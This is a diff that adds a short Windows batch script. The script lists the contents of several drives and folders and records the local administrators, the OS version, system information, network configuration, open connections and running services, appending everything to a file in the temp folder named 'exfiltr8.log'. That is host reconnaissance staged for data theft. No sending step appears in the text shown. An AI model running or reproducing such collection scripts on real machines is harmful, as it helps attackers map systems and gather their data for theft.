@@ -1,0 +1,10 @@
+dir c:\ >> %temp%\exfiltr8.log
+dir "c:\Documents and Settings" >> %temp%\exfiltr8.log
+dir "c:\Program Files\" >> %temp%\exfiltr8.log
+dir d:\ >> %temp%\exfiltr8.log
+net localgroup administrator >> %temp%\exfiltr8.log
+ver >> %temp%\exfiltr8.log
+systeminfo >> %temp%\exfiltr8.log
+ipconfig /all >> %temp%\exfiltr8.log
+netstat -ano >> %temp%\exfiltr8.log
+net start >> %temp%\exfiltr8.log
